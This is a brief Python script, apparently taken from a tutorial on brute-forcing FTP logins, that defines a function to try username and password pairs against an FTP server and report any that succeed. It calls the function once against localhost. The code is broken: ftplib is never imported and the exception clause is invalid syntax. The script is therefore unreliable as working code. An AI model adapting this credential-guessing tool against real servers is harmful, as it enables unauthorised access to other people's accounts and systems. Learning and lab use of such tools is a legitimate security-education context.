
# reference link : https://vinsloev.medium.com/python-cybersecurity-brute-force-ftp-83e401ad0643



def bruteForceLogin(hostname,userName,passWord):
    print("[+] Trying: " + str(userName) + "/" + str(passWord))
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login(userName, passWord)
        print("FTP Login succeded: " + str(userName) + "/" + str(passWord))
        ftp.quit()
        return (userName, passWord)
    except Exception e:
        pass
          
userName = "admin"
passWord = "pass1"
hostName = '127.0.0.1'     
bruteForceLogin(hostName,userName,passWord)          
